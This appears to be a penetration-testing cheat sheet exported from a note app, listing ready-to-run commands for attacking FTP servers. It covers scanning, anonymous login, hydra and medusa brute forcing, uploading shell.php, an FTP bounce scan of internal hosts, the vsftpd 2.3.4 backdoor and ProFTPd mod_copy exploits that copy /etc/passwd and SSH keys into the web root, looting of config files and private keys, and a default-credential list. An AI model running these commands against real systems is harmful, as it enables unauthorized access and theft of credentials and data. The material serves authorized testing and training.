---
id: "8c8l67attmpsisf6l"
title: "ftp"
description: ""
tags: []
order: "2"
createdAt: "2026-05-30T15:43:00.573Z"
updatedAt: "2026-05-30T15:43:16.267Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"0ihaeihv4mpsisr0e","order":0,"collapsed":false} -->

### rexmnpq8empsisr20
```bash
nmap -sV -sC -p 21 $TARGET
```

_Port Discovery & Scanning_

**Tags:** ftp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"rexmnpq8empsisr20","language":"bash","sectionId":"0ihaeihv4mpsisr0e","tags":["ftp","nmap","rustscan","recon","discovery"]} -->

### 6srwjgz3lmpsisr24
```bash
nmap -p 21 --script ftp-anon,ftp-banner,ftp-bounce,ftp-brute,ftp-syst,ftp-vsftpd-backdoor $TARGET
```

**Tags:** ftp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"6srwjgz3lmpsisr24","language":"bash","sectionId":"0ihaeihv4mpsisr0e","tags":["ftp","nmap","rustscan","recon","discovery"]} -->

### 15rfskfhqmpsisr28
```bash
rustscan -a $TARGET -p 21 -- -sV --script ftp-anon,ftp-banner
```

**Tags:** ftp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"15rfskfhqmpsisr28","language":"bash","sectionId":"0ihaeihv4mpsisr0e","tags":["ftp","nmap","rustscan","recon","discovery"]} -->

## Anonymous Login Check
<!-- section: {"id":"ba8xz2wa1mpsisr0i","order":1,"collapsed":false} -->

### 1o0bqkl5vmpsisr2f
```bash
ftp $TARGET
```

_Anonymous Login Check_

**Tags:** ftp, anonymous, unauthenticated, enumeration
<!-- cmd: {"id":"1o0bqkl5vmpsisr2f","language":"bash","sectionId":"ba8xz2wa1mpsisr0i","tags":["ftp","anonymous","unauthenticated","enumeration"]} -->

### rceqn49s1mpsisr2i
```bash
nmap --script ftp-anon -p 21 $TARGET
```

**Tags:** ftp, anonymous, unauthenticated, enumeration
<!-- cmd: {"id":"rceqn49s1mpsisr2i","language":"bash","sectionId":"ba8xz2wa1mpsisr0i","tags":["ftp","anonymous","unauthenticated","enumeration"]} -->

### blbuliq3nmpsisr2m
```bash
netexec ftp $TARGET -u anonymous -p anonymous
```

**Tags:** ftp, anonymous, unauthenticated, enumeration
<!-- cmd: {"id":"blbuliq3nmpsisr2m","language":"bash","sectionId":"ba8xz2wa1mpsisr0i","tags":["ftp","anonymous","unauthenticated","enumeration"]} -->

### ynbulwb71mpsisr2p
```bash
curl -s ftp://$TARGET/ --user anonymous:anonymous
```

**Tags:** ftp, anonymous, unauthenticated, enumeration
<!-- cmd: {"id":"ynbulwb71mpsisr2p","language":"bash","sectionId":"ba8xz2wa1mpsisr0i","tags":["ftp","anonymous","unauthenticated","enumeration"]} -->

## Authenticated Login & Browse
<!-- section: {"id":"9g11k67lempsisr0l","order":2,"collapsed":false} -->

### r9z944rdompsisr2w
```bash
ftp $TARGET
```

_Authenticated Login & Browse_

**Tags:** ftp, authentication, browse, download
<!-- cmd: {"id":"r9z944rdompsisr2w","language":"bash","sectionId":"9g11k67lempsisr0l","tags":["ftp","authentication","browse","download"]} -->

### jsy3xjay0mpsisr2z
```bash
curl -s ftp://$TARGET/ --user "$USER:$PASS"
```

**Tags:** ftp, authentication, browse, download
<!-- cmd: {"id":"jsy3xjay0mpsisr2z","language":"bash","sectionId":"9g11k67lempsisr0l","tags":["ftp","authentication","browse","download"]} -->

### 6k67b3j37mpsisr33
```bash
curl -s ftp://$TARGET/file.txt -o file.txt --user "$USER:$PASS"
```

**Tags:** ftp, authentication, browse, download
<!-- cmd: {"id":"6k67b3j37mpsisr33","language":"bash","sectionId":"9g11k67lempsisr0l","tags":["ftp","authentication","browse","download"]} -->

### q8oltr91mmpsisr36
```bash
wget -r --no-passive ftp://$USER:$PASS@$TARGET/
```

**Tags:** ftp, authentication, browse, download
<!-- cmd: {"id":"q8oltr91mmpsisr36","language":"bash","sectionId":"9g11k67lempsisr0l","tags":["ftp","authentication","browse","download"]} -->

## Brute Force
<!-- section: {"id":"ounu4sws5mpsisr0o","order":3,"collapsed":false} -->

### zke2acvb1mpsisr3d
```bash
hydra -L users.txt -P passwords.txt ftp://$TARGET -t 4 -f
```

_Brute Force_

**Tags:** ftp, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"zke2acvb1mpsisr3d","language":"bash","sectionId":"ounu4sws5mpsisr0o","tags":["ftp","bruteforce","hydra","medusa","netexec"]} -->

### h8j0jv48zmpsisr3g
```bash
hydra -l $USER -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://$TARGET
```

**Tags:** ftp, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"h8j0jv48zmpsisr3g","language":"bash","sectionId":"ounu4sws5mpsisr0o","tags":["ftp","bruteforce","hydra","medusa","netexec"]} -->

### yrfo81jvjmpsisr3k
```bash
medusa -h $TARGET -U users.txt -P passwords.txt -M ftp -t 4
```

**Tags:** ftp, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"yrfo81jvjmpsisr3k","language":"bash","sectionId":"ounu4sws5mpsisr0o","tags":["ftp","bruteforce","hydra","medusa","netexec"]} -->

### 0cg16vpj7mpsisr3n
```bash
netexec ftp $TARGET -u users.txt -p passwords.txt --continue-on-success
```

**Tags:** ftp, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"0cg16vpj7mpsisr3n","language":"bash","sectionId":"ounu4sws5mpsisr0o","tags":["ftp","bruteforce","hydra","medusa","netexec"]} -->

### 7b2x9cd0impsisr3r
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$TARGET
```

**Tags:** ftp, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"7b2x9cd0impsisr3r","language":"bash","sectionId":"ounu4sws5mpsisr0o","tags":["ftp","bruteforce","hydra","medusa","netexec"]} -->

## File Upload & Download
<!-- section: {"id":"09gvwmtwlmpsisr0t","order":4,"collapsed":false} -->

### 73bzv94hkmpsisr44
```bash
ftp $TARGET
```

_File Upload & Download_

**Tags:** ftp, upload, download, file-access
<!-- cmd: {"id":"73bzv94hkmpsisr44","language":"bash","sectionId":"09gvwmtwlmpsisr0t","tags":["ftp","upload","download","file-access"]} -->

### eeg014kwampsisr48
```bash
put shell.php
```

**Tags:** ftp, upload, download, file-access
<!-- cmd: {"id":"eeg014kwampsisr48","language":"bash","sectionId":"09gvwmtwlmpsisr0t","tags":["ftp","upload","download","file-access"]} -->

### 41j1gtoiempsisr4b
```bash
curl -T shell.php ftp://$TARGET/ --user "$USER:$PASS"
```

**Tags:** ftp, upload, download, file-access
<!-- cmd: {"id":"41j1gtoiempsisr4b","language":"bash","sectionId":"09gvwmtwlmpsisr0t","tags":["ftp","upload","download","file-access"]} -->

### oazjayy50mpsisr4f
```bash
wget -m --no-passive ftp://$USER:$PASS@$TARGET/
```

**Tags:** ftp, upload, download, file-access
<!-- cmd: {"id":"oazjayy50mpsisr4f","language":"bash","sectionId":"09gvwmtwlmpsisr0t","tags":["ftp","upload","download","file-access"]} -->

### puxspud5pmpsisr4i
```bash
curl ftp://$TARGET/etc/passwd --user "$USER:$PASS" -o passwd
```

**Tags:** ftp, upload, download, file-access
<!-- cmd: {"id":"puxspud5pmpsisr4i","language":"bash","sectionId":"09gvwmtwlmpsisr0t","tags":["ftp","upload","download","file-access"]} -->

## FTP Bounce Attack
<!-- section: {"id":"euzd30pgzmpsisr0w","order":5,"collapsed":false} -->

### yznlekdzxmpsisr4r
```bash
nmap -b $USER:$PASS@$TARGET $INTERNAL_TARGET
```

_FTP Bounce Attack Use FTP server as proxy to scan internal hosts._

**Tags:** ftp, bounce, pivot, internal-scan
<!-- cmd: {"id":"yznlekdzxmpsisr4r","language":"bash","sectionId":"euzd30pgzmpsisr0w","tags":["ftp","bounce","pivot","internal-scan"]} -->

### h1zokmh9wmpsisr4v
```bash
nmap --script ftp-bounce -p 21 $TARGET
```

**Tags:** ftp, bounce, pivot, internal-scan
<!-- cmd: {"id":"h1zokmh9wmpsisr4v","language":"bash","sectionId":"euzd30pgzmpsisr0w","tags":["ftp","bounce","pivot","internal-scan"]} -->

## vsftpd 2.3.4 Backdoor (CVE-2011-2523)
<!-- section: {"id":"8bvowlhltmpsisr0z","order":6,"collapsed":false} -->

### s9o44m82gmpsisr53
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

_234_

**Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
<!-- cmd: {"id":"s9o44m82gmpsisr53","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->

### 8afwqnf55mpsisr57
```bash
set RHOSTS $TARGET
```

**Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
<!-- cmd: {"id":"8afwqnf55mpsisr57","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->

### 1nqaw6refmpsisr5a
```bash
run
```

**Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
<!-- cmd: {"id":"1nqaw6refmpsisr5a","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->

### be43nj8cimpsisr5f
```bash
echo "USER test:)" | nc $TARGET 21
```

**Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
<!-- cmd: {"id":"be43nj8cimpsisr5f","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->

### ha5jg50a2mpsisr5i
```bash
echo "PASS test" | nc $TARGET 21
```

**Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
<!-- cmd: {"id":"ha5jg50a2mpsisr5i","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->

### 3c28mjrsqmpsisr5m
```bash
nc $TARGET 6200
```

**Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
<!-- cmd: {"id":"3c28mjrsqmpsisr5m","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->

## ProFTPd mod_copy Exploit (CVE-2015-3306)
<!-- section: {"id":"csz16qxxcmpsisr13","order":7,"collapsed":false} -->

### kg5ajrpo1mpsisr5y
```bash
nc $TARGET 21
```

_ProFTPd mod_

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"kg5ajrpo1mpsisr5y","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

### yxy7ph3agmpsisr62
```bash
SITE CPFR /etc/passwd
```

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"yxy7ph3agmpsisr62","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

### yiv72kc29mpsisr65
```bash
SITE CPTO /var/www/html/passwd.txt
```

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"yiv72kc29mpsisr65","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

### lxetvsvfwmpsisr69
```bash
curl http://$TARGET/passwd.txt
```

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"lxetvsvfwmpsisr69","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

### ywnzimmx7mpsisr6c
```bash
nc $TARGET 21
```

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"ywnzimmx7mpsisr6c","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

### ejsou3qxxmpsisr6f
```bash
SITE CPFR /home/$USER/.ssh/authorized_keys
```

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"ejsou3qxxmpsisr6f","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

### hp0elv61gmpsisr6j
```bash
SITE CPTO /var/www/html/authorized_keys.txt
```

**Tags:** ftp, proftpd, mod_copy, cve, exploitation
<!-- cmd: {"id":"hp0elv61gmpsisr6j","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->

## Sensitive File Hunt
<!-- section: {"id":"t4k7s68mxmpsisr16","order":8,"collapsed":false} -->

### 5gz1n52yumpsisr6y
```bash
ftp $TARGET
```

_Sensitive File Hunt_

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"5gz1n52yumpsisr6y","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### zxq20x1tumpsisr72
```bash
ls -la
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"zxq20x1tumpsisr72","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### 916trmkw5mpsisr75
```bash
ls -laR (recursive listing)
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"916trmkw5mpsisr75","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### zyw5jrmx8mpsisr7a
```bash
get wp-config.php
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"zyw5jrmx8mpsisr7a","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### ltor6huhkmpsisr7c
```bash
get config.php
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"ltor6huhkmpsisr7c","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### ipa33t0g6mpsisr7g
```bash
get .htpasswd
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"ipa33t0g6mpsisr7g","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### 9f5bs5crgmpsisr7k
```bash
get backup.zip
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"9f5bs5crgmpsisr7k","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### h8fni87n6mpsisr7n
```bash
get database.sql
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"h8fni87n6mpsisr7n","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

### 0p4x74k0cmpsisr7r
```bash
get id_rsa
```

**Tags:** ftp, sensitive-files, loot, post-exploitation
<!-- cmd: {"id":"0p4x74k0cmpsisr7r","language":"bash","sectionId":"t4k7s68mxmpsisr16","tags":["ftp","sensitive-files","loot","post-exploitation"]} -->

## Passive vs Active Mode Issues
<!-- section: {"id":"c2sskb0j6mpsisr19","order":9,"collapsed":false} -->

### jr3kdc6vcmpsisr80
```bash
curl --ftp-pasv ftp://$TARGET/ --user "$USER:$PASS"
```

_Passive vs Active Mode Issues_

**Tags:** ftp, passive, active, firewall, bypass
<!-- cmd: {"id":"jr3kdc6vcmpsisr80","language":"bash","sectionId":"c2sskb0j6mpsisr19","tags":["ftp","passive","active","firewall","bypass"]} -->

### 8rhllqr2ompsisr83
```bash
curl --ftp-port - ftp://$TARGET/ --user "$USER:$PASS"
```

**Tags:** ftp, passive, active, firewall, bypass
<!-- cmd: {"id":"8rhllqr2ompsisr83","language":"bash","sectionId":"c2sskb0j6mpsisr19","tags":["ftp","passive","active","firewall","bypass"]} -->

### ifshotgb0mpsisr87
```bash
lftp -u "$USER,$PASS" $TARGET
```

**Tags:** ftp, passive, active, firewall, bypass
<!-- cmd: {"id":"ifshotgb0mpsisr87","language":"bash","sectionId":"c2sskb0j6mpsisr19","tags":["ftp","passive","active","firewall","bypass"]} -->

### 1mx3n2sy6mpsisr8a
```bash
mirror / ./ftp_loot/
```

**Tags:** ftp, passive, active, firewall, bypass
<!-- cmd: {"id":"1mx3n2sy6mpsisr8a","language":"bash","sectionId":"c2sskb0j6mpsisr19","tags":["ftp","passive","active","firewall","bypass"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"wxsuo2njnmpsisr1c","order":10,"collapsed":false} -->

### fct43ue4rmpsisr8i
```bash
nmap -p 21 --script "ftp-*" $TARGET -v
```

_NSE Scripts — Comprehensive Scan_

**Tags:** ftp, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"fct43ue4rmpsisr8i","language":"bash","sectionId":"wxsuo2njnmpsisr1c","tags":["ftp","nmap","nse","vulnerability-scan"]} -->

### 19asu42chmpsisr8m
```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $TARGET
```

**Tags:** ftp, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"19asu42chmpsisr8m","language":"bash","sectionId":"wxsuo2njnmpsisr1c","tags":["ftp","nmap","nse","vulnerability-scan"]} -->

## Common Misconfigurations
<!-- section: {"id":"m1eqqic3umpsisr1g","order":11,"collapsed":false} -->

### d6x3r76j0mpsisr91
```bash
curl -T test.txt ftp://$TARGET/ --user anonymous:anonymous
```

_Common Misconfigurations_

**Tags:** ftp, misconfiguration, anonymous-write, cleartext
<!-- cmd: {"id":"d6x3r76j0mpsisr91","language":"bash","sectionId":"m1eqqic3umpsisr1g","tags":["ftp","misconfiguration","anonymous-write","cleartext"]} -->

### h18ffxrcwmpsisr95
```bash
ftp $TARGET
```

**Tags:** ftp, misconfiguration, anonymous-write, cleartext
<!-- cmd: {"id":"h18ffxrcwmpsisr95","language":"bash","sectionId":"m1eqqic3umpsisr1g","tags":["ftp","misconfiguration","anonymous-write","cleartext"]} -->

### c52d3vldompsisr99
```bash
put test.txt
```

**Tags:** ftp, misconfiguration, anonymous-write, cleartext
<!-- cmd: {"id":"c52d3vldompsisr99","language":"bash","sectionId":"m1eqqic3umpsisr1g","tags":["ftp","misconfiguration","anonymous-write","cleartext"]} -->

### jhvbd0k97mpsisr9c
```bash
ftp $TARGET
```

**Tags:** ftp, misconfiguration, anonymous-write, cleartext
<!-- cmd: {"id":"jhvbd0k97mpsisr9c","language":"bash","sectionId":"m1eqqic3umpsisr1g","tags":["ftp","misconfiguration","anonymous-write","cleartext"]} -->

### ecu9jqfb8mpsisr9f
```bash
get /etc/passwd
```

**Tags:** ftp, misconfiguration, anonymous-write, cleartext
<!-- cmd: {"id":"ecu9jqfb8mpsisr9f","language":"bash","sectionId":"m1eqqic3umpsisr1g","tags":["ftp","misconfiguration","anonymous-write","cleartext"]} -->

### gd4r7gz2ompsisr9j
```bash
tcpdump -i eth0 -w ftp_traffic.pcap port 21
```

**Tags:** ftp, misconfiguration, anonymous-write, cleartext
<!-- cmd: {"id":"gd4r7gz2ompsisr9j","language":"bash","sectionId":"m1eqqic3umpsisr1g","tags":["ftp","misconfiguration","anonymous-write","cleartext"]} -->

## Default Credentials
<!-- section: {"id":"xr0mhwp1lmpsisr1j","order":12,"collapsed":false} -->

### gd0tz4kibmpsisr9s
```bash
admin:admin
```

_Default Credentials_

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"gd0tz4kibmpsisr9s","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### umsg4w8w1mpsisr9v
```bash
admin:password
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"umsg4w8w1mpsisr9v","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### 1pjcdk1u8mpsisr9y
```bash
admin:(blank)
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"1pjcdk1u8mpsisr9y","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### gws1nmz3fmpsisra2
```bash
anonymous:anonymous
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"gws1nmz3fmpsisra2","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### b45x0d8bbmpsisra5
```bash
anonymous:(blank)
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"b45x0d8bbmpsisra5","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### rt9gjzak9mpsisra9
```bash
ftp:ftp
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"rt9gjzak9mpsisra9","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### 40sf5g22empsisrab
```bash
ftpuser:ftpuser
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"40sf5g22empsisrab","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### 8zarvsqj1mpsisraf
```bash
user:password
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"8zarvsqj1mpsisraf","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->

### l94o0c53vmpsisraj
```bash
root:root
```

**Tags:** ftp, default-credentials, bruteforce
<!-- cmd: {"id":"l94o0c53vmpsisraj","language":"bash","sectionId":"xr0mhwp1lmpsisr1j","tags":["ftp","default-credentials","bruteforce"]} -->
